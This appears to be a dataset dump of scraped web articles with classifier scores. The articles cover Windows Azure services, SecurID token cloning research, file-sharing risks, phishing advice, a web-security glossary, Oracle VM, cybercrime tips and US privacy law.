doing, code frequently needs to interact with other code. In some situations, all that's needed is basic queued messaging. In other cases, more complex interactions are required. Windows Azure provides a few different ways to solve these problems. Figure 6 illustrates the choices. Figure 6: For connecting applications, Windows Azure provides queues, publish/subscribe, and synchronous connections via the cloud. Queuing is a simple idea: One application places a message in a queue, and that message is eventually read by another application. If your application needs just this straightforward service, Windows Azure Queues might be the best choice. One common use of Queues today is to let a web role instance communicate with a worker role instance within the same Cloud Services application. For example, suppose you create a Windows Azure application for video sharing. The application consists of PHP code running in a web role that lets users upload and watch videos, together with a worker role implemented in C# that translates uploaded video into various formats. When a web role instance gets a new video from a user, it can store the video in a blob, then send a message to a worker role via a queue telling it where to find this new video. A worker role instance-it doesn't matter which one-will then read the message from the queue and carry out the required video translations in the background. Structuring an application in this way allows asynchronous processing, and it also makes the application easier to scale, since the number of web role instances and worker role instances can be varied independently. Whether they run in the cloud, in your data center, on a mobile device, or somewhere else, applications need to interact. The goal of Windows Azure Service Bus is to let applications running pretty much anywhere exchange data. As Figure 6 shows, Service Bus provides a queuing service. This service isn't identical to the Queues just described, however. Unlike Windows Azure Queues, for example, Service Bus provides a both queues (one-to-one) and publish-and-subscribe mechanisms. With publish-subscribe, an application can send messages to a topic, while other applications can create subscriptions to this topic. This allows one-to-many communication among a set of applications, letting the same message be read by multiple recipients. And queuing isn't the only option: Service Bus also allows direct communication through its relay service, providing a secure way to interact through firewalls. Service Bus relays enable applications to communicate by exchanging messages through an endpoint hosted in the cloud, rather than locally. Applications that communicate through Service Bus might be Windows Azure applications or software running on some other cloud platform. They can also be applications running outside the cloud, however. For example, think of an airline that implements reservation services in computers inside its own datacenter. The airline needs to expose these services to many clients, including check-in kiosks in airports, reservation agent terminals, and maybe even customers' phones. It might use Service Bus to do this, creating loosely coupled interactions among the various applications. Applications tend to access the same data over and over. One way to improve performance is to keep a copy of that data closer to the application, minimizing the time needed to retrieve it. Windows Azure provides two different services for doing this: in-memory caching of data used by Windows Azure applications and a content delivery network (CDN) that caches blob data on disk closer to its users. Figure 7 shows both. Figure 7: A Windows Azure application can cache data in memory, and copies of a blob can be cached at sites around the world. Accessing data stored in any of Windows Azure's data management services-SQL Database, Tables, or Blobs-is quite fast. Yet accessing data stored in memory is even faster. Because of this, keeping an in-memory copy of frequently accessed data can improve application performance. You can use Windows Azure's in-memory Caching to do this. A Cloud Services application can store data in this cache, then retrieve it directly without needing to access persistent storage. As Figure 7 shows, the cache can be maintained inside your application's VMs or be provided by VMs dedicated solely to caching. In either case, the cache can be distributed, with the data it contains spread across multiple VMs in a Windows Azure datacenter. An application that repeatedly reads a product catalog might benefit from using this kind of caching, for example, since the data it needs will be available more quickly. The technology also supports locking, letting it be used with read/write as well as read-only data. And ASP.NET applications can use the service to store session data with just a configuration change. Suppose you need to store blob data that will be accessed by users around the world. Maybe it's a video of the latest World Cup match, for instance, or driver updates, or a popular e-book. Storing a copy of the data in multiple Windows Azure datacenters will help, but if there are lots of users, it's probably not enough. For even better performance, you can use the Windows Azure CDN. The CDN has dozens of sites around the world, each capable of storing copies of Windows Azure blobs. The first time a user in some part of the world accesses a particular blob, the information it contains is copied from a Windows Azure datacenter into local CDN storage in that geography. After this, accesses from that part of the world will use the blob copy cached in the CDN-they won't need to go all the way to the nearest Windows Azure datacenter. The result is faster access to frequently accessed data by users anywhere in the world. Working with identity is part of most applications. For example, knowing who a user is lets an application decide how it should interact with that user. To help you do this, Microsoft provides Windows Azure Active Directory. Like most directory services, Windows Azure Active Directory stores information about users and the organizations they belong to. It lets users log in, then supplies them with tokens they can present to applications to prove their identity. It also allows synchronizing user information with Windows Server Active Directory running on premises in your local network. While the mechanisms and data formats used by Windows Azure Active Directory aren’t identical with those used in Windows Server Active Directory, the functions it performs are quite similar. It's important to understand that Windows Azure Active Directory is designed primarily for use by cloud applications. It can be used by applications running on Windows Azure, for example, or on other cloud platforms. It's also used by Microsoft's own cloud applications, such as those in Office 365. If you want to extend your datacenter into the cloud using Windows Azure Virtual Machines and Windows Azure Virtual Network, however, Windows Azure Active Directory isn't the right choice. Instead, you'll want to run Windows Server Active Directory in cloud VMs, as described earlier. To let applications access the information it contains, Windows Azure Active Directory provides a RESTful API called Windows Azure Active Directory Graph. This API lets applications running on any platform access directory objects and the relationships among them. For example, an authorized application might use this API to learn about a user, the groups he belongs to, and other information. Applications can also see relationships between users-their social graph-letting them work more intelligently with the connections among people. Another capability of this service, Windows Azure Active Directory Access Control, makes it easier for an application to accept identity information from Facebook, Google, Windows Live ID, and other popular identity providers. Rather than requiring the application to understand the diverse data formats and protocols used by each of these providers, Access Control translates all of them into a single common format. It also lets an application accept logins from one or more Active Directory domains. For example, a vendor providing a SaaS application might use Windows Azure Active Directory Access Control to give users in each of its customers single sign-on to the application. Directory services are a core underpinning of on-premises computing. It shouldn't be surprising that they're also important in the cloud. One of the most attractive ways to use a cloud platform is for high-performance computing (HPC), The essence of HPC is executing code on many machines at the same time. On Windows Azure, this means running many virtual machines simultaneously, all working in parallel to solve some problem. Doing this requires some way to schedule applications, i.e., to distribute their work across these instances. To allow this, Windows Azure provides the HPC Scheduler. This component can work with HPC applications built to use the industry-standard Message Passing Interface (MPI). Software that does finite element analysis, such as car crash simulations, is one example of this type of application, and there are many others. The HPC Scheduler can also be used with so-called embarrassingly parallel applications, such as Monte Carlo simulations. Whatever problem is addressed, the value it provides is the same: The HPC Scheduler handles the complex problem of scheduling parallel computing work across many Windows Azure virtual machines. The goal is to make it easier to build HPC applications running in the cloud. Video makes up a large part of Internet traffic today, and that percentage will be even larger tomorrow. Yet providing video on the web isn't simple. There are lots of variables, such as the encoding algorithm and the display resolution of the user's screen. Video also tends to have bursts in demand, like a Saturday night spike when lots of people decide they'd like to watch an online movie. Given its popularity, it's a safe bet that many new applications will be created that use video. Yet all of them will need to solve some of the same problems, and making each one solve those problems on its own makes no sense. A better approach is to create a platform that provides common solutions for many applications to use. And building this platform in the cloud has some clear advantages. It can be broadly available on a pay-as-you-go basis, and it can also handle the variability in demand that video applications often face. Windows Azure Media Services addresses this problem. It provides a set of cloud components that make life easier for people creating and running applications using video and other media. Figure 8 illustrates the technology. Figure 8: Media Services is a platform for applications that provide video and other media to clients around the world. As the figure shows, Media Services provides a set of components for applications that work with video and other media. For example, it includes a media ingest component to upload video into Media Services (where it's stored in Windows Azure Blobs), an encoding component that supports various video and audio formats, a content protection component that provides digital rights management, a component for inserting ads into a video stream, components for streaming, and more. Microsoft partners can also provide components for the platform, then have Microsoft distribute those components and bill on their behalf. Applications that use this platform can run on Windows Azure or elsewhere. For example, a desktop application for a video production house might let its users upload video to Media Services, then process it in various ways. Alternatively, a cloud-based content management service running on Windows Azure might rely on Media Services to process and distribute video. Wherever it runs and whatever it does, each application chooses which components it needs to use, accessing them through RESTful interfaces. To distribute what it produces, an application can use the Windows Azure CDN, another CDN, or just send bits directly to users. However it gets there, video created using Media Services can be consumed by various client systems, including Windows, Macintosh, HTML 5, iOS, Android, Windows Phone, Flash, and Silverlight. The goal is to make it easier to create modern media applications. The rise of Software as a Service is transforming how we create applications. It's also transforming how we sell applications. Since a SaaS application lives in the cloud, it makes sense that its potential customers should look for solutions online. And this change applies to data as well as to applications. Why shouldn't people look to the cloud for commercially available datasets? Microsoft addresses both of these concerns with Windows Azure Marketplace and Windows Azure Store, illustrated in Figure 9. Figure 9: Windows Azure Marketplace and Windows Azure Store let you find and buy Windows Azure applications and commercial datasets. The difference between the two is that Marketplace is outside of the Windows Azure Management Portal, but the Store can be accessed from the portal. Potential customers can search either to find Windows Azure applications that meet their needs, then sign up to use them either through the application's creator or directly through the Marketplace or Store. Customers can search either for commercial datasets as well, including demographic data, financial data, geographic data, and more. When they find something they like, they can access it either from the vendor, directly through the Marketplace or Store web locations or in some cases from the Management Portal. Applications can also use the Bing Search API through the Marketplace, giving them access to the results of web searches. Back in 2008, the very first pre-release version of Windows Azure supported only .NET development. Today, however, you can create Windows Azure applications in pretty much any language. Microsoft currently provides language-specific SDKs for .NET, Java, PHP, Node.js, Ruby, and Python. There's also a general Windows Azure SDK that provides basic support for any language, such as C++. These SDKs help you build, deploy, and manage Windows Azure applications. They're available either from www.windowsazure.com or GitHub, and they can be used with Visual Studio and Eclipse. Windows Azure also offers command line tools that developers can use with any editor or development environment, including tools for deploying applications to Windows Azure from Linux and Macintosh systems. Along with helping you build Windows Azure applications, these SDKs also provide client libraries that help you create software running outside the cloud that uses Windows Azure services. For example, you might build an application running at a hoster that relies on Windows Azure blobs, or create a tool that deploys Windows Azure applications through the Windows Azure management interface. Now that you have the big-picture, the next step is to write your first Windows Azure application. Choose your language, get the appropriate SDK, and go for it. Cloud computing is the new default--get started now.",
        "prob": "tensor([[1.2176e-05, 9.9999e-01]])"
    },
    {
        "text": "A researcher has devised a method that attackers with control over a victim's computer can use to clone the secret software token that RSA's SecurID uses to generate one-time passwords. The technique, described on Thursday by a senior security analyst at a firm called SensePost, has important implications for the safekeeping of the tokens. An estimated 40 million people use various SecurID tokens to access confidential data belonging to government agencies, military contractors, and corporations. Scrutiny of the widely used two-factor authentication system has grown since last year, when RSA revealed that intruders on its networks stole sensitive SecurID information that could be used to reduce its security. Defense contractor Lockheed Martin later confirmed that a separate attack on its systems was aided by the theft of the RSA data. Last week's blog post by SensePost's Behrang Fouladi demonstrated another way determined attackers could in certain cases circumvent protections built into SecurID. By reverse engineering software used to manage the cryptographic software tokens on computers running Microsoft's Windows operating system, he found that the secret \"seed\" was easy for people with control over the machines to locate and copy. He provided step-by-step instructions for others to follow in order to demonstrate how easy it is to create clones that mimic verbatim the output of a targeted SecurID token. \"When the above has been performed, you should have successfully cloned the victim's software token and if they run the SecurID software token program on your computer, it will generate the exact same random numbers that are displayed on the victim's token,\" Fouladi wrote. He arrived at that conclusion by reverse engineering the Windows software that allows SecurID users to make one-time passwords appear on their PCs, rather than on match-case-sized hardware tokens RSA provides. The cryptographic seed values at the heart of the SecurID system make it mathematically infeasible for others to predict the output that changes every 90 seconds or so, but only if the values remain secret. RSA spokesman Kevin Kempskie told Ars: \"It's not uncommon for a large software company like ours to see security researchers demonstrate theoretical attacks on a product. We have a really experienced product security team and we take these things very seriously and we're going to have them take a closer look at it.\" Fouladi discovered that the RSA seed value is easy to obtain and copy by anyone with access to a computer that's lost, stolen, or has been compromised with a backdoor trojan. By reading chunks of data returned by a proprietary Microsoft security interface known as the data protection application programming interface (DPAPI), an attacker can obtain and copy the encrypted value. Even when an optional copy protection known as a token binding is in place, it can be bypassed because the required serial number is determined by a combination of the host name and current user's Windows security identifier stored on the computer. He told Ars that smartphones that are lost or stolen might be susceptible to similar attacks, although he stressed he has no reason to believe that the values can be remotely retrieved from smartphones infected with malware, as long as the devices haven't been jailbroken or rooted. \"Should people stop using the SecurID software tokens?\" he wrote in an e-mail. \"It depends. It is dependent on the probability of the device being stolen or malicious applications installed from a dubious source. Personally, for high-risk situations, for example government agency laptops for staff that travel and frequently have to connect back to secure networks, using the token, I wouldn't recommend it.\" Fouladi noted that both RSA and its customers have been targeted by highly motivated hackers, so attack scenarios in which PCs are infected or stolen aren't unrealistic. He suggested the sensitive RSA data should be managed by a industry-wide specification known as the TPM, or trusted platform module. Post updated to clarify SecurID's user base and to make clear the attack doesn't deduce seed values.",
        "prob": "tensor([[2.1012e-06, 1.0000e+00]])"
    },
    {
        "text": "Ask a high school or college kid about their iPod or video library and you’ll soon hear a lot about file sharing. It’s used as a method for swapping favorite music files, TV shows or movies, often avoiding paying fees for them. And it’s often illegal. With the Recording Industry Association of America (RIAA) actively sending “Cease and Desist” letters to anyone found to be illegally trading copyrighted materials, it’s in your family’s best interest to talk about the right and the wrong ways to find and share music and movies. Recently, Sweden erupted in a furor when a new law went into effect including severe penalties for anyone using illegal file sharing systems. It’s estimated that 1 in 10 Swedes uses these systems. When the new law went into effect last week requiring the ISPs to turn in those using these systems, the overall effect was shocking. Internet traffic in Sweden fell by 30%, immediately! According to a Symantec study, an estimated 90% of avid gamers also engage in file sharing. Sweden represents 3% of the worldwide total for file sharing. The reason security companies like Symantec care about file sharing is that it’s so difficult for people to keep these programs secure. By their nature, they open a door into the family computer and invite Internet strangers to come on in, take a few files and leave a few behind. These systems are notorious for spreading viruses and keystroke loggers (dangerous little programs that spy on your every keyboard click and report your private info out to others on the internet.) They've been used to distribute pornography and child pornography, hiding these terrible images with innocuously-coded file names to trick the users of the systems. They are also blamed for criminals getting access to people’s tax records. Here's a story that recently aired on The Today Show about how a family's computer was hacked for their valuable tax records using a popular music sharing service. If you haven’t sat with your teen to discuss the right way to acquire music and watch TV shows and videos online, you need to do so. Your lack of involvement might be risking the safety of your computer and all your private information. Even worse, you may be at risk of legal action if your computer is found to be involved in any of the many illegal activity known to be a part of illegal file sharing systems. Here's a good guide to disabling peer to peer file sharing systems. And this pamphlet from the RIAA for parents and teachers has a comprehensive list of the legal sites for purchasing music. Message Edited by marianmerritt on 04-06-2009 06:12 PM",
        "prob": "tensor([[2.1206e-06, 1.0000e+00]])"
    },
    {
        "text": "Every Internet site in the world is facing the growing issue of fraudulent usage of information, and we want to work with users around the world to stop this practice. Please keep reading to learn more about the warning signs and what you can do. Spam email is such a common occurrence today that you may think you know what to look for. But there are two types of email scams — what's known as 'phishing' and 'spoofing' — that can be more difficult to identify. Both practices concern fraudulent email where the 'from address' has been forged to make it appear as if it came from somewhere, or someone, other than the actual source. Below are the warning signs to look for: What's 'phishing' all about - and how do I spot it? Phishing emails are used to fraudulently obtain personal identification and account information. They can also be used to lure the recipient into downloading malicious software. The message will often suggest there are issues with the recipient's account that requires immediate attention. A link will also be provided to a spoof website where the recipient will be asked to provide personal/account information or download malicious software. Monster will never ask you to download software in order to access your account or use our services. How is it different than 'spoofing'? Spoof emails often include a fraudulent offer of employment and/or the invitation to serve as a go-between for payment processing or money transfers. This scam is primarily directed at a general audience, but it can also reach Monster members who have included contact information on their resume. Like with phishing emails, the sender's address is often disguised. Examples of fraudulent email These examples of fraudulent email show you what to watch out for (click to see details): Consumer Advice: How to Avoid Phishing Scams The number and sophistication of phishing scams sent out to consumers is continuing to increase dramatically. While online banking and e-commerce is very safe, as a general rule you should be careful about giving out your personal financial information over the Internet. The Anti-Phishing Working Group has compiled a list of recommendations that you can use to avoid becoming a victim of these scams. - Be suspicious of any email with urgent requests for personal financial information - Phishers typically include upsetting or exciting (but false) statements in their emails to get people to react immediately - They typically ask for information such as usernames, passwords, credit card numbers, social security numbers, date of birth, etc. - Don't use the links in an email, instant message, or chat to get to any web page if you suspect the message might not be authentic - Instead, call the company on the telephone, or log onto the website directly by typing in the Web address in your browser - You should only communicate information such as credit card numbers or account information via a secure website or the telephone - Always ensure that you're using a secure website when submitting credit card or other sensitive information via your Web browser Additional consumer advice is available at http://antiphishing.org/consumer_recs.html Contact us at http://www.monster.com/contact/",
        "prob": "tensor([[2.1716e-06, 1.0000e+00]])"
    },
    {
        "text": "authentication provider. The party responsible for validating a user's credentials and issuing a token that can be used to access other sites. This is the web site you visit to do the actual authentication. content injection. In a web application that accepts data input from users, content injection refers to the act of an attacker attempting to insert HTML or client script content that will be processed by a client browser, or SQL commands that the server may process. If successful, content injection of HTML or client scripts will cause the website to behave undesirably for any user that views the injected content because it's being processed by their browser as legitimate HTML or client script. Content injection can result in many undesirable effects, such as causing parts of a web page to disappear, diverting user requests to a malicious location, or allowing an attacker to eavesdrop. SQL injection does not affect the client browser, but if a web application accepts user input and uses it to dynamically create a SQL query without verifying the content, an attacker can inject syntax into the SQL query to manipulate the database and even the database server if it's not locked down properly. This type of attack can lead to deleted data, dropped databases, or even allow operating system commands to run as if you were typing them at the command line. cross-site scripting (XSS). An attack whereby scripts from a malicious source are executed on a client browser as part of a trusted web page. Websites that build pages with data elements originating from other sources, such as user input or shared databases, are vulnerable to XSS attacks. cross-site request forgery (CSRF). An attack in which a client browser is manipulated into performing malicious actions on a server with which the client has some form of trusted relationship through authentication, HTTPS, or IP filtering. An attacker embeds a link or a script in a piece of untrusted content that does something on the trusted site to which the user is currently authenticated. A simple example is an image element embedded in an HTML email that includes a URL query string, which performs a malicious action. If users click the image, they unknowingly initiate the act on the site where they are authenticated. Data Model. An object that represents an entity built for data storage services. These are not available for use outside the boundaries of the application and are often encapsulated behind a services layer. Domain Model. An object that represents an entity in the problem domain, which may also be annotated or extended to support some application features such as validation or authentication. Because these models need to be shared between the server and client browser, they are sometimes contained within view models and used directly for data-binding in HTML forms. Application models and service models are variations of domain models. eavesdropping. Exploiting a web application using a network data capture utility to find and record HTTP requests and responses between a website and a client. Eavesdropping can lead to disclosure of sensitive information such as passwords, personal, or financial information, and can potentially allow the execution of spoofing, tampering and message replay attacks. flow diagram. A diagram that defines the pages in the site, actions available on those pages, and navigation between pages. This diagram reflects the user stories identified in the requirements. Forms authentication. Forms authentication enables user and password validation for web applications that do not require Windows authentication. Form Model. An entity that represents all of the fields in an HTML form that is specific to a controller action. It contains only the data that is passed into the action. Generally, this corresponds to whatever form is posting back to the server. Form Models (sometimes called Request Models) are a special case of View Models. View Models are more generic in that they may also include additional data needed to render a page. A Form Model might end up being a property on another View Model. fragment identifier. The portion of a URL identified by the hash (#). With regard to browser navigation, hyperlinks include them to make the hyperlink unique. When used in conjunction with the hashchange event, page content is able to change without performing a full-page reload. given-when-then template. A helpful template for defining acceptance criteria that include the context of the test (given), the action being tested (when), and the expected outcome (then). This template provides clear and concise documentation that can be understood by team members and can be used to generate both manual and automated test scripts. jQuery selectors. A syntactical aspect of jQuery that allows you to select all DOM elements based on specific criteria (tag name, id, attribute name, value, and more). Once the selection is made, jQuery is used to operate on the selected elements. Jump List. List of commonly used tasks and destinations, enabling easy user access to destinations by eliminating the need to launch the browser and then load the relevant content. Also allows users to perform common tasks without launching the web application in advance. This is a feature of Windows® Internet Explorer® 9. malicious input. Bad data that causes your system to behave undesirably and/or corrupts data. message replay attack. An attack that alters the contents of a captured HTTP request and re-submits it to the website. message tampering. When an attacker maliciously alters the content of request and/or response messages flowing between two parties across a network. For example, if a customer submits an order for 100 widgets to an online merchant, an attacker might alter the order request to order 10,000 widgets instead. Message tampering can be part of a message replay attack or a man-in-the-middle attack. mock. The typical strategy for isolating your component under test is to supply an alternative component or function that the component calls instead of supplying the real component. These alternative components may also be referred to as fakes, doubles, or stubs. mockup. A visual representation that shows what the site will eventually look like. Mockups contain details such as typography, color, gradients, images, and transparency, but no functionality. Mockups should communicate all necessary details of the UI. To do so, multiple mockups for a single page may be required to convey details of the different states of the application. mood board. A visual collage made up of images and color palettes from a variety of sources that communicate the emotional connection the application aims to have with the users. persona. A representation of a particular type of user the team can identify with. A persona is a user in context that embodies work style, role, motivation, skills, and goals. If you have a complicated or large application, some features might target multiple personas. pinned site. A feature of Windows Internet Explorer 9 that integrates your website with the Windows 7 desktop. Pinned sites enable easy access to favorite websites and add shortcut functionality similar to shortcuts in Microsoft® Windows applications. With pinned sites enabled for a website, users can pin the site to the Windows 7 taskbar or add the site to the desktop or Start menu. With this feature, you can add site metadata, create custom jump lists, notification icons, and Thumbnail Preview toolbar controls for the websites you develop. Plain Old CLR Object (POCO). Refers to a class in the Microsoft .NET Framework that does not have any dependencies on external libraries such as the Entity Framework. For example, if a class inherits from a base class provided in an external library, it is not a POCO. progressive enhancement. Adds features to the client-side experience based on browser capabilities. Publish/Subscribe pattern (pub/sub). A messaging pattern that enables loose communication between publishers and subscribers. A pub/sub object manages communication, relieving the publishers and subscribers from having direct knowledge of one another. relying party. The party trying to validate a user based on a security token that was issued by an authentication provider. repository. A set of interfaces and implementations providing methods for data access. Repository pattern. This pattern assists the data model in separating data storage concerns from the application logic. The interfaces do not expose any data storage-specific types and the implementation classes use them. You can choose how many repositories to create based on how granular you want to factor the methods and the expected data access pattern from your application. rule of thirds. This is a rule of thumb for visual composition that states that an image should be imagined as divided into nine equal parts by two equally-spaced horizontal lines and two equally-spaced vertical lines. Important compositional elements should be placed along these lines or their intersections. safe list. A list that limits input by only allowing what is known to be valid. The advantage of safe lists is that anything that falls outside of the valid set of characters is not allowed. salt. A salt is a value combined with a cryptographic key to make the output of an encryption algorithm more random and less susceptible to attack. sandboxing. Technique that allows components of the application to be tested before the entire application is complete. It also makes testing more robust by preventing software defects in one module from blocking or affecting the testing of other modules. Single-Page Interface (SPI) pattern. A pattern for web applications that reduces the number of full-page reloads during user navigation. When a user performs an action, such as selecting a hyperlink, which traditionally requires the site to load a new web page, the application instead modifies the current web page without reloading it. single-page interface web application. Web application where the user is only required to perform a full-page load once. From that point on, all page changes and data loading is performed without a full-page reload. Hotmail, Office Live, and Twitter are examples of single-page interface web applications. sliding expiration. A pre-determined amount of time where an authenticated user can use the site. The amount of time is reset whenever the user makes a new request to the server. The advantage of using a sliding expiration is that it does not force the user to authenticate again if he or she maintains a reasonable level of activity in the application. Otherwise, the user would be redirected to the authentication page after a fixed amount of time had elapsed after the initial authentication. static web application. Web sites consisting of static HTML pages, CSS, and images. As each page is navigated to, the browser performs a full-page reload. structure. The HTML of the page as it relates to the hierarchy of elements that make up the page, rather than the visual appearance or layout of the UI. topic. The message between the publisher and subscriber in a pub/sub environment. This message, also often referred to as an event, represents the contract between the sender and receiver, and is made up of a name and an optional message body. user gestures. A specific action that a user takes in order to interact with an application. Traditionally, gestures include mouse clicks and keys presses. However, many modern applications also employ interactions in which a user acts more directly on an application. For example, they may touch a screen to swipe, pinch, or pull content. ViewBag. The name/value keyed collection that lets you store any loosely typed data. ASP.NET MVC 3 introduced the ViewBag (called ViewData in previous versions) in addition to View.Model. View Models. Models contained within the MVC application which are built solely for a view to data-bind against. They often follow the same composition hierarchy as the views and partial views. widget method. The method that represents the primary interface for applying the widget to elements and using the widget after it's applied. The widget method is named after the name of the widget. wireframe. A diagram that depicts rough placement of the text, data, and basic controls of a UI. These diagrams are tools used to help organize the page's information. A wireframe does not show details of the page. wrapped set. A wrapped set is the result of a query that uses a jQuery selector to find elements in the DOM. To call a method on a wrapped set of elements, a selector is used to select elements in the DOM. For example, to add the listing CSS class to all ul elements directly inside a div element, you can use $('div ul').addClass('listing').",
        "prob": "tensor([[2.0634e-06, 1.0000e+00]])"
    },
    {
        "text": "At Oracle OpenWorld 2007, Oracle announced new virtualization software, causing a firestorm of interest and a decline in competitor vmware's stock. Oracle VM, which can be downloaded free, is based on the Xen open-source hypervisor product. With It's back to the future for the Oracle database world. The inefficient one server/one database approach of 1990s client-server technology is long gone and Oracle shops are now re-consolidating their data resources, moving back to the mainframe-like centralization of the 1980s. While Oracle touts VM as a latest-and-greatest solution, we need to remember that server virtualization has been around for decades. Virtualization is simply the partitioning of a server in order to host multiple OS environments. Whether it's running virtual Windows on your Macintosh laptop or partitioning a 128 CPU mainframe, IT managers are leveraging virtualization solutions to consolidate multiple OS environments. At a high level, virtualization is the process of segregating server resources in a homogeneous environment, but it's most commonly used to host different operating systems within a single monolithic server -- and this is a step toward OS independence. A brief history of Oracle virtualization Oracle rose to dominate the database market primarily because of its ability to run on more than 60 platforms, everything from a mainframe to a Macintosh. However, Oracle soon faced the challenge of running multiple OS environments within the same server. In early 2005, Oracle announced that their version of VMWare would come pre-loaded with both Linux and Oracle, making it easier than ever to run Linux on a MS Windows server. Oracle then embraced the idea of server consolidation via the 11g Grid Initiative. At Openworld 2007, Oracle claimed that 99% of their customers run multiple instances within a single host machine and so began pushing the new VM product. Although VM is free for download, support will cost $499/year for 1 or 2 CPU systems and $999/year for others. Thus far, VM is limited to Intel platforms, and will support only Linux and Windows servers. Oracle VM also offers a GUI management console (HTML-based) to allow easy management of both the overall OS and the virtual machines running under the master OS. Oracle is incorporating virtualization along several areas: - SOA - Oracle plans to incorporate Oracle VM into their Fusion stack, allowing a method for unifying diverse applications onto a single server using SOAP. Oracle President Charles Phillips notes that Oracle VM will help SAP shops migrate from their foreign ERP's to Oracle Applications. \"We want to help customers integrate their software with third-party applications made in Germany,\" he said at OpenWorld. - Consolidating heterogeneous environments - Oracle VM is useful for shops that wish to consolidate different applications onto a single hardware platform. A common example is running Windows side-by-side with UNIX (HP/UX, Solaris, AIX, Linux) on a large monolithic server. For example, instead of buying six 2 CPU servers, you can buy one 4 CPU 64-bit server with 16 GB RAM, and save a bundle of cash. For details, see my notes on the trend towards Oracle server consolidation. - Oracle OLAP consolidation - Mark Rittman notes the benefits of running Oracle 10g R2 with virtualization with the Oracle Business Intelligence Suite (OLAP). - Oracle application server - Oracle Application Server can be run with Oracle on a single server using VM. John Garmany has some good notes on Oracle App Server and virtualization. - Students - Using virtualization is popular among people who want to learn RAC on a personal computer, whereby VM can allow a single server to mimic several RAC nodes. The second age of mainframe computing The early 21st century is seeing the second age of mainframe computing, a change away from the minicomputer hardware architectures of past decades. Instead of small, independent servers, the major hardware vendors are pushing large servers with transparent sharing of hardware resources, coining the term \"partitionable servers.\" But how does Oracle VM fit into these existing virtualization techniques? There are some shortcomings of Oracle VM: - Unshared resources - Server resources cannot be easily shared, and it counteracts the goal of server consolidation to leverage on a massive shared computing resource. - Measurable overhead - We must remember that Oracle VM imposes some overhead, and a savvy DBA will always perform a workload benchmark using other alternatives (containers, para-virtualization) before choosing virtualization. - Bad for the DBA job market - Server consolidation is bad for the DBA job market because one of the main reasons for consolidating hardware resources is the savings from reducing DBA staff. A typical shop can save a million dollars a year by removing a dozen DBAs. The one-server/one-application paradigm has proven too expensive, so many enterprises are now moving back to the centralized architectures of old. In sum, Oracle VM fits nicely into the strategic plans for server consolidation but the savvy Oracle professional must recognize that virtualization has both benefits and limitations. It remains to be seen whether VM will become a permanent part of the data center, of if it will be only used as a stopgap tool for shops that want to run Windows in a Linux environment. About the author Donald K. Burleson has been a database administrator since the 1980s and manages the USA's largest remote DBA support service. He is also a popular author and serves as series editor for Rampant TechPress, a leading provider of Oracle technical books. This was first published in December 2007",
        "prob": "tensor([[2.1061e-06, 1.0000e+00]])"
    },
    {
        "text": "Protecting yourself from cybercrime (BPT) - Gone are the days when hackers were the weekend enthusiasts you tolerated on the golf course, when viruses were the things that gave you the flu or a cold, and Phish was a popular jam band who served as the inspiration for your favorite flavor of Ben and Jerry's. With the rise of the Internet and electronic devices has come the rise of cyber-related crime. Cybercrime, as it is called, is defined as a criminal activity using computers or other electronic devices to victimize people, organizations or businesses. \"Despite a global recession, improved security and international crackdown efforts, cybercrime has thrived over the last decade, growing by double digits year after year,\" says Clint Kirkwood, a professor of Criminal Justice at Argosy University , Orange County and 28-year veteran and retired commanding officer of the vice section of the narcotics division of the Detroit Police Department. While estimates of the cost of cyber crime to businesses and the private sector vary, a 2011 publication released by Javelin Strategy and Research, the annual cost of identity theft alone was $37 billion. \"Today, some of the most successful criminals do not have to leave the comfort of their own homes to pull off crimes bigger than ever. All they need is an Internet connection, a little tech savvy and a lot of bad will,\" says Kirkwood. The Internet Crime Complaint Center received more than 300,000 complaints in 2011, which included such crimes as FBI-related scams, identity theft, advance fee fraud and a host of romance, work-from-home, auto auction, loan intimidation and other scams. \"Since the take-off of social networking and the paperless way of conducting business, cyber-based criminal activity has skyrocketed in many corners of the world,\" says Gary Gonzales, a professor in the Criminal Justice program at Argosy University, San Diego and police detective in his 16th year of service with the San Diego Police Department. \"Criminals are masking themselves as potential customers, clients or even professionals to lure innocent people into a web of deception and greed. From copyright infringement and cyber bullying to child pornography and spamming, the impact is enormous.\" Knowing the threats you face online and the tools available to help you keep a watchful eye is critical in protecting yourself in the digital world. There are simple precautions that computer, mobile phone and other digital users can take to ensure their safety. Do not open emails/attachments from unknown or suspicious sources, nor answer email messages that ask for your personal information. \"The widows of Nigerian generals desperately seeking your financial assistance and notifications that you've won a European lottery are obvious scams but some email fraud can be much more difficult to distinguish,\" says Arabinda Banerjee, senior vice president of Technology Infrastructure at a leading bank in Tampa, Florida and faculty member at Argosy University, Tampa. \"In general, if it seems too good to be true or requires you to send money in to receive a reward, be sure to avoid it. Emails with vague but feel-good subject lines like 'Congratulations! ' or the name of a friend and the message 'has shared a picture/video ' can be malicious emails, even when apparently sent out by one of your friends.\" Do an Internet search using the term 'scam' and some of the key words from the message, advises Banerjee. If it's a known scam, you'll likely see it pop up in your search engine results. Invest in a good anti-virus software and firewall, the experts suggest. While this will not guarantee 100 percent protection, they will definitely reduce your risk greatly. Be sure that any WiFi connection you are using to conduct financial business is locked and protected and any stores you are making purchases from are reputable. In addition, be sure to monitor your financial accounts monthly to determine any fraudulent charges and report suspicious activity immediately. Change your passwords frequently and create passwords that are difficult to guess. Do not use the same ID/password in all websites. While keeping track of multiple logins and passwords may be an inconvenience, it's a necessary protection against hackers.",
        "prob": "tensor([[2.1153e-06, 1.0000e+00]])"
    },
    {
        "text": "right of privacy: access to personal information The right of privacy has evolved to protect the ability of individuals to determine what sort of information about themselves is collected, and how that information is used. Most commercial websites utilize \"cookies,\" as well as forms, to collect information from visitors such as name, address, email, demographic info, social security number, IP address, and financial information. In many cases, this information is then provided to third parties for marketing purposes. Other entities, such as the federal government and financial institutions, also collect personal information. The threats of fraud and identity theft created by this flow of personal information have been an impetus for right of privacy legislation requiring disclosure of information collection practices, opt-out opportunities, as well as internal protections of collected information. However, such requirements have yet to reach all segments of the marketplace. 15 U.S.C. § 45 charges the Federal Trade Commission (FTC) with preventing \"unfair methods of competition in or affecting commerce and unfair or deceptive acts or practices in or affecting commerce.\" In matters of privacy, the FTC's role is one of enforcing privacy promises made in the marketplace. Several additional laws form the foundation on which the FTC carries out this charge: the Privacy Act of 1974 (5 U.S.C. § 552a), the Gramm-Leach-Bliley Act (15 U.S.C. §§ 6801-6809), the Fair Credit Reporting Act (15 U.S.C. § 1681 et seq.), and the Children's Online Privacy Protection Act (15 U.S.C. §§ 6501-6506). The Privacy Act of 1974 (5 U.S.C. § 552a) protects personal information held by the federal government by preventing unauthorized disclosures of such information. Individuals also have the right to review such information, request corrections, 